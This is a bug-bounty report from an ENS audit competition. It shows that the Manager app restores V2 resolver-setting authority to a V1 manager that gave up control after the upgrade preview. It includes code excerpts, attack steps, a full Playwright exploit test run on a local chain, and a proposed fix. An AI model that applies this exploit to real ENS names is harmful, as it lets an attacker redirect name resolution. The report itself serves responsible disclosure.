# 92341 w a medium manager restores v2 resolver authority to a v1 manager removed before confirmation

**Submitted on Sep 9th 2026 at 03:30:47 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92341
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

### Summary

Manager preserves a separate ENSv1 manager by saving the manager address shown in its Upgrade preview and later granting that address V2 `ROLE_SET_RESOLVER`. It does not bind that grant to the live ENSv1 registry owner when the user confirms Upgrade.

The embedded end-to-end test starts with an accurate V1 manager row. After Manager has prepared the normal Upgrade flow, that current manager itself relinquishes V1 control on-chain by calling `ENSRegistry.setOwner(node, registrant)`. A live read confirms that the registrant is the manager before confirmation. The user then confirms Upgrade, but Manager restores V2 resolver authority to the removed manager. That account uses the restored role to replace the V2 resolver with an attacker-selected address.

The test finally has the owner revoke the stale role. The role becomes false, but the attacker-selected resolver remains. A separate corrective resolver transaction is required.

### Vulnerability details

The Upgrade query is cached for five minutes in `apps/manager/src/features/migration/hooks/useV1Names.ts:12-23`:

```ts
return queryOptions({
  queryKey: qk('migration', 'v1_names', {
    address: address?.toLowerCase(),
  }),
  queryFn:
    enabled && address ? () => getV1NamesForAddress(address) : skipToken,
  staleTime: 5 * 60 * 1000,
})
```

The initial classification records a distinct V1 registry owner as `managerAddress`. Before execution, `apps/manager/src/features/migration/service/migrationService.ts:886-927` rebuilds the atomic plan from the existing `remaining` classifications rather than rereading the live V1 registry manager:

```ts
const atomicPlan = await buildAtomicMigrationBatches({
  chainId: ctx.publicClient.chain?.id ?? 11155111,
  hca: ctx.hcaAddress,
  wallet: ctx.walletAddress,
  classified: remaining,
  directRoutes,
  profiles: plan.profiles,
})
```

`buildAtomicMigrationBatches.ts:608-624` turns that retained address into both an execution and its success condition:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })
  verificationExpectations.push({
    type: 'manager-role',
    // ...
    account: classified.managerAddress,
    roleBitmap: ROLE_SET_RESOLVER,
  })
}
```

`buildRoleGrantCalls.ts:11-26` encodes the unchecked address directly:

```ts
functionName: 'grantRoles',
args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
```

Finally, `verifyAtomicMigrationBatch.ts:337-353` only verifies that the retained account received the role. It does not verify that the account was still the live V1 manager at execution.

The root cause is therefore a Manager TOCTOU: the identity whose authority will be restored is checked at preview but used later without a live binding at confirmation.

### Attack path

1. An unwrapped `.eth` name has a registrant and a separate, attacker-controlled current V1 manager.
2. Manager receives that accurate state and enables the normal Upgrade flow.
3. After preview, the current manager calls the real V1 Registry `setOwner(node, registrant)`, relinquishing its V1 authority.
4. A live read confirms the registrant is the V1 manager before Upgrade is confirmed.
5. The registrant confirms the already prepared Upgrade flow.
6. Manager migrates the name and grants V2 `ROLE_SET_RESOLVER` to the removed manager because that address remains in the retained classification.
7. The removed manager calls the real V2 Registry `setResolver()` and installs an attacker-selected resolver address.
8. Revoking the stale role prevents further authorized calls but does not undo the resolver replacement.

The attacker cannot force the registrant to confirm Upgrade, and the account had legitimate V1 manager authority when the page first loaded. Those constraints reduce likelihood. A plausible attack is for the manager to appear to comply with a request to hand control back while an Upgrade preview is already open, timing the hand-back so Manager silently recreates its authority in V2. The attacker, rather than the victim, performs the post-preview state change.

### Impact

The closest listed competition impact is the Critical Manager migration row: a V1-to-V2 migration assigns a name, registry, or resolver to an attacker. Here, the Manager migration itself grants resolver-setting authority to an address that is no longer the V1 manager. The later direct `setResolver()` call is consequence evidence; the in-scope root is the unintended grant created by Manager's migration transaction.

The proof does not claim ownership theft, irrecoverability, or an attacker-controlled address record. The victim retains token ownership and admin authority and can repair the resolver with another transaction. The demonstrated consequence is an unauthorized resolver assignment that persists after role revocation until that separate repair occurs. These feasibility and recovery constraints may reduce the adjudicated severity.

### Why the earlier closure no longer applies

* **“The tests do not execute the actual migration.”** The new Playwright E2E opens the normal Manager migration page, authorizes the connected-wallet requests, signs and mines the migration, and waits for the real Upgrade success dialog.
* **“The consequence test manually grants the role.”** It does not. The test only reads `hasRoles`; the actual Manager migration grants the role.
* **“The victim retains ownership and admin authority.”** The claimed impact is the wrong resolver assignment, not ownership theft.
* **“The victim can revoke the role.”** The test performs that revocation. `hasRoles` becomes false while `getResolver(label)` still returns the attacker-selected address.
* **“The stale window depends on out-of-scope indexer timing.”** The supplied V1 row exactly matches live chain state when Manager loads. The attacker changes the real V1 manager only after preview. Instrumentation records every V1-name query, and the first query after preview observes that the stale V2 role is already granted. No inaccurate execution-time indexer answer creates the result.
* **“The attacker cannot create the reclaim transition.”** The fresh proof does not use victim `reclaim()`. The current manager/attacker itself sends `ENSRegistry.setOwner(node, registrant)` and the transaction succeeds before confirmation.

### Prior-report disclosure

This is the same root as my closed report `#89616`, which Immunefi matched to private report `#89249`. The new evidence supplies the missing full migration flow; I am asking for one assessment of this root, not a second finding.

## Proof of Concept

### Proof of concept

Tested against the frozen `audit-comp-ready` branch at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`. The affected application source is unchanged from the imported competition snapshot. The PoC enables the repository's existing migration feature with `posthog.featureFlags.overrideFeatureFlags({ migration: true })`; this does not change migration planning, calldata, or chain state.

PoC files, embedded in full below:

* `poc-attacker-relinquishes-v1-manager.spec.ts` — copy to `e2e/projects/manager/tests/`
* `poc-attacker-relinquishes-v1-manager.playwright.config.ts` — copy to `e2e/projects/manager/`

Install dependencies and start the repository's local stack from the repository root:

```bash
pnpm install --frozen-lockfile
pnpm e2e:infra:up
```

Start Manager in another terminal. The committed CI environment points it at the local stack and it listens on port 3000:

```bash
pnpm --filter manager dev -- --mode ci
```

Then run the PoC from `e2e`:

```bash
MANAGER_APP_URL=http://127.0.0.1:3000 \
ANVIL_RPC_URL=http://127.0.0.1:8545 \
pnpm exec playwright test \
  --config projects/manager/poc-attacker-relinquishes-v1-manager.playwright.config.ts \
  --reporter=list
```

After the test, stop the Manager process and run `pnpm e2e:infra:down` from the repository root.

Canonical output:

```
[attacker-manager-poc] name=mig-attacker-relinquish-1788879369310.eth
[attacker-manager-poc] registrant=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[attacker-manager-poc] former-manager=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[attacker-manager-poc] transition-sender=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[attacker-manager-poc] live-v1-manager=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
[attacker-manager-poc] names-queries-at-preview=2
[attacker-manager-poc] names-query-observations=[{"requestNumber":1,"phase":"before-manager-load","staleRoleAlreadyGranted":false},{"requestNumber":2,"phase":"before-manager-load","staleRoleAlreadyGranted":false},{"requestNumber":3,"phase":"upgrade-clicked","staleRoleAlreadyGranted":true}]
[attacker-manager-poc] v2-role-granted=true
[attacker-manager-poc] hijacked-v2-resolver=0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc
[attacker-manager-poc] role-after-revocation=false
[attacker-manager-poc] resolver-after-revocation=0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc
1 passed (16.0s)
```

The V1 query route is mocked only because the local harness does not run the production V1 subgraph. Before Manager loads, the test creates the same manager and registrant on the local chain and confirms the live registry manager equals the row supplied to Manager. All later state transitions, the Manager UI, wallet authorization, migration, role grant, resolver replacement, role revocation, and final resolver read are real.

SHA-256:

```
d40aa16946c9d49be297e7a715788bd0fdedc486f1701b0559e8f1e72359134c  poc-attacker-relinquishes-v1-manager.spec.ts
b37a68ce66e301484c6d39909809ed91c0ef85861708b358277e9dc956f66655  poc-attacker-relinquishes-v1-manager.playwright.config.ts
307d0ff84e946b419ae997138e7a8dcf868a42b39e48468200dcf44b5983cc5c  TERMINAL-OUTPUT.txt
```

Full exact test:

```ts
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import {
  type Address,
  encodeFunctionData,
  keccak256,
  namehash,
  parseAbi,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'

import {
  createV1NameOnAnvil,
  DEFAULT_ACCOUNT,
  V2_ETH_REGISTRY_ADDR,
} from '../../../../packages/dev-migration-tool/src/MigrationTestPanel.helpers.js'
import {
  authorizeTransactionsWhile,
  expect,
  test,
} from '../../../fixtures/playwright.manager.fixture.js'
import { publicClient, walletClient } from '../../../helpers/anvil-client.js'
import {
  connectWithHeadlessWallet,
  dismissBackendAuthModal,
} from '../../../helpers/manager-auth.js'

const MANAGER_APP_URL = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'
const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://localhost:8545'
const V1_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e' as Address
const ROLE_SET_RESOLVER = 1n << 24n

const V1_REGISTRY_ABI = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node, address owner)',
])

const V2_REGISTRY_ABI = parseAbi([
  'function getResolver(string label) view returns (address)',
  'function setResolver(uint256 resource, address resolver)',
  'function hasRoles(uint256 resource, uint256 rolesBitmap, address account) view returns (bool)',
  'function revokeRoles(uint256 resource, uint256 roleBitmap, address account) returns (bool)',
])

const waitForTx = async (hash: `0x${string}`) => {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return receipt
}

const mockInitialV1Manager = async (
  page: import('@playwright/test').Page,
  params: {
    name: string
    registrant: Address
    formerManager: Address
  },
) => {
  const requestCounts = {
    namesForAddress: 0,
    profilesForDomains: 0,
    phase: 'before-manager-load',
    namesObservations: [] as Array<{
      requestNumber: number
      phase: string
      staleRoleAlreadyGranted: boolean
    }>,
  }
  const label = params.name.replace(/\.eth$/i, '')
  const node = namehash(params.name)
  const resource = labelToCanonicalId(label)
  const now = Math.floor(Date.now() / 1000)
  const domain = {
    id: node,
    labelName: label,
    labelhash: keccak256(toHex(label)),
    name: params.name,
    resolver: null,
    owner: { id: params.formerManager.toLowerCase() },
    registrant: { id: params.registrant.toLowerCase() },
    wrappedOwner: null,
    parent: { name: 'eth', wrappedDomain: null },
    registration: { expiryDate: String(now + 365 * 24 * 60 * 60) },
    wrappedDomain: null,
  }

  await page.route('**v1-graphql.ens.dev/**', async (route, request) => {
    const body = JSON.parse(request.postData() ?? '{}') as {
      operationName?: string
    }
    if (body.operationName === 'getNamesForAddress') {
      requestCounts.namesForAddress += 1
      const staleRoleAlreadyGranted = await publicClient
        .readContract({
          address: V2_ETH_REGISTRY_ADDR,
          abi: V2_REGISTRY_ABI,
          functionName: 'hasRoles',
          args: [resource, ROLE_SET_RESOLVER, params.formerManager],
        })
        .catch(() => false)
      requestCounts.namesObservations.push({
        requestNumber: requestCounts.namesForAddress,
        phase: requestCounts.phase,
        staleRoleAlreadyGranted,
      })
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ data: { domains: [domain] } }),
      })
    }
    if (body.operationName === 'getProfilesForDomains') {
      requestCounts.profilesForDomains += 1
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ data: { domains: [] } }),
      })
    }
    return route.continue()
  })

  return requestCounts
}

test.describe('attacker-controlled stale ENSv1 manager migration', () => {
  test.describe.configure({ timeout: 300_000 })

  test('restores a manager that relinquished V1 control after preview', async ({
    page,
    wallet,
    accounts,
  }) => {
    const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
    const formerManager = privateKeyToAccount(accounts.getPrivateKey('user2'))
    const attackerResolver = privateKeyToAccount(
      accounts.getPrivateKey('user3'),
    ).address

    expect(owner.address.toLowerCase()).toBe(DEFAULT_ACCOUNT.toLowerCase())
    const label = `mig-attacker-relinquish-${Date.now()}`
    await createV1NameOnAnvil(ANVIL_RPC_URL, label, 'unwrapped')
    const v1Name = `${label}.eth`
    const node = namehash(v1Name)
    const resource = labelToCanonicalId(label)

    await waitForTx(
      await walletClient.sendTransaction({
        account: owner,
        to: V1_REGISTRY,
        data: encodeFunctionData({
          abi: V1_REGISTRY_ABI,
          functionName: 'setOwner',
          args: [node, formerManager.address],
        }),
      }),
    )
    expect(
      (
        await publicClient.readContract({
          address: V1_REGISTRY,
          abi: V1_REGISTRY_ABI,
          functionName: 'owner',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(formerManager.address.toLowerCase())

    const v1QueryCounts = await mockInitialV1Manager(page, {
      name: v1Name,
      registrant: owner.address,
      formerManager: formerManager.address,
    })
    await page.addInitScript(() => {
      const apply = () => {
        const current = window as Window & {
          managerFeatureFlagsOverridden?: boolean
          posthog?: {
            __loaded?: boolean
            featureFlags?: {
              overrideFeatureFlags(options: {
                flags: Record<string, boolean>
              }): void
            }
          }
        }
        if (!current.posthog?.__loaded || !current.posthog.featureFlags)
          return false
        current.posthog.featureFlags.overrideFeatureFlags({
          flags: { migration: true },
        })
        current.managerFeatureFlagsOverridden = true
        return true
      }
      if (!apply()) {
        const timer = window.setInterval(() => {
          if (apply()) window.clearInterval(timer)
        }, 10)
      }
    })

    await page.goto(MANAGER_APP_URL)
    await connectWithHeadlessWallet(page, wallet)
    await dismissBackendAuthModal(page)
    await page.waitForFunction(
      () =>
        (
          window as Window & {
            managerFeatureFlagsOverridden?: boolean
          }
        ).managerFeatureFlagsOverridden === true,
      undefined,
      { timeout: 10_000 },
    )
    await page.goto(`${MANAGER_APP_URL}/migration`)
    await page.waitForLoadState('networkidle')

    const confirmButton = page.getByRole('button', {
      name: /Upgrade 1 name/,
    })
    await expect(confirmButton).toBeEnabled({ timeout: 60_000 })
    v1QueryCounts.phase = 'preview-ready'
    const namesQueriesAtPreview = v1QueryCounts.namesForAddress

    // The current manager, not the victim, creates the stale window by
    // relinquishing V1 control after Manager has captured the preview.
    await waitForTx(
      await walletClient.sendTransaction({
        account: formerManager,
        to: V1_REGISTRY,
        data: encodeFunctionData({
          abi: V1_REGISTRY_ABI,
          functionName: 'setOwner',
          args: [node, owner.address],
        }),
      }),
    )
    const liveV1Manager = (
      await publicClient.readContract({
        address: V1_REGISTRY,
        abi: V1_REGISTRY_ABI,
        functionName: 'owner',
        args: [node],
      })
    ).toLowerCase()
    expect(liveV1Manager).toBe(owner.address.toLowerCase())
    v1QueryCounts.phase = 'attacker-relinquished-before-upgrade'

    console.log(`[attacker-manager-poc] name=${v1Name}`)
    console.log(`[attacker-manager-poc] registrant=${owner.address}`)
    console.log(
      `[attacker-manager-poc] former-manager=${formerManager.address}`,
    )
    console.log(
      `[attacker-manager-poc] transition-sender=${formerManager.address}`,
    )
    console.log(`[attacker-manager-poc] live-v1-manager=${liveV1Manager}`)
    console.log(
      `[attacker-manager-poc] names-queries-at-preview=${namesQueriesAtPreview}`,
    )

    const successIndicator = page.getByRole('dialog', {
      name: 'Your name has been upgraded!',
    })
    let migrationFinished = false
    const authorizeAllMigrationTransactions = authorizeTransactionsWhile(
      page,
      wallet,
      () => migrationFinished,
    )
    v1QueryCounts.phase = 'upgrade-clicked'
    await confirmButton.click()
    await successIndicator.waitFor({ state: 'visible', timeout: 90_000 })
    v1QueryCounts.phase = 'success-visible'
    migrationFinished = true
    await authorizeAllMigrationTransactions

    const firstNamesQueryAfterPreview = v1QueryCounts.namesObservations.find(
      ({ requestNumber }) => requestNumber > namesQueriesAtPreview,
    )
    expect(firstNamesQueryAfterPreview).toBeDefined()
    expect(firstNamesQueryAfterPreview?.staleRoleAlreadyGranted).toBe(true)

    const staleRoleWasGranted = await publicClient.readContract({
      address: V2_ETH_REGISTRY_ADDR,
      abi: V2_REGISTRY_ABI,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, formerManager.address],
    })
    expect(staleRoleWasGranted).toBe(true)

    await waitForTx(
      await walletClient.sendTransaction({
        account: formerManager,
        to: V2_ETH_REGISTRY_ADDR,
        data: encodeFunctionData({
          abi: V2_REGISTRY_ABI,
          functionName: 'setResolver',
          args: [resource, attackerResolver],
        }),
      }),
    )
    const hijackedResolver = (
      await publicClient.readContract({
        address: V2_ETH_REGISTRY_ADDR,
        abi: V2_REGISTRY_ABI,
        functionName: 'getResolver',
        args: [label],
      })
    ).toLowerCase()
    expect(hijackedResolver).toBe(attackerResolver.toLowerCase())

    await waitForTx(
      await walletClient.sendTransaction({
        account: owner,
        to: V2_ETH_REGISTRY_ADDR,
        data: encodeFunctionData({
          abi: V2_REGISTRY_ABI,
          functionName: 'revokeRoles',
          args: [resource, ROLE_SET_RESOLVER, formerManager.address],
        }),
      }),
    )
    const staleRoleAfterRevocation = await publicClient.readContract({
      address: V2_ETH_REGISTRY_ADDR,
      abi: V2_REGISTRY_ABI,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, formerManager.address],
    })
    const resolverAfterRevocation = (
      await publicClient.readContract({
        address: V2_ETH_REGISTRY_ADDR,
        abi: V2_REGISTRY_ABI,
        functionName: 'getResolver',
        args: [label],
      })
    ).toLowerCase()

    console.log(
      `[attacker-manager-poc] names-query-observations=${JSON.stringify(v1QueryCounts.namesObservations)}`,
    )
    console.log(`[attacker-manager-poc] v2-role-granted=${staleRoleWasGranted}`)
    console.log(
      `[attacker-manager-poc] hijacked-v2-resolver=${hijackedResolver}`,
    )
    console.log(
      `[attacker-manager-poc] role-after-revocation=${staleRoleAfterRevocation}`,
    )
    console.log(
      `[attacker-manager-poc] resolver-after-revocation=${resolverAfterRevocation}`,
    )

    expect(staleRoleAfterRevocation).toBe(false)
    expect(resolverAfterRevocation).toBe(attackerResolver.toLowerCase())
  })
})

```

Full exact Playwright config:

```ts
import { defineConfig } from '@playwright/test'

import { baseConfig } from '../../playwright.config.base.js'

export default defineConfig({
  ...baseConfig,
  timeout: 300_000,
  testDir: './tests',
  use: {
    ...baseConfig.use,
    baseURL: process.env.MANAGER_APP_URL ?? 'http://localhost:3000',
  },
  projects: [
    {
      name: 'ens-attacker-manager-poc',
      testMatch: /poc-attacker-relinquishes-v1-manager\.spec\.ts$/,
    },
  ],
})

```

### Expected behavior

Immediately before building each signed migration batch, Manager should read the current V1 Registry owner for every unwrapped name with a planned manager-role restoration. If it differs from the reviewed address, Manager should stop, rebuild the plan, and require the user to review the changed grantee.

### Actual behavior

Manager grants V2 resolver authority to the previewed address even though that address relinquished V1 manager authority before confirmation.

### Recommended fix

At confirmation, bind each planned manager-role grant to a fresh live V1 Registry `owner(node)` read. Remove or recompute `managerAddress` when it changed, and make post-state verification compare the recipient against the live value used for that execution rather than the retained preview value.
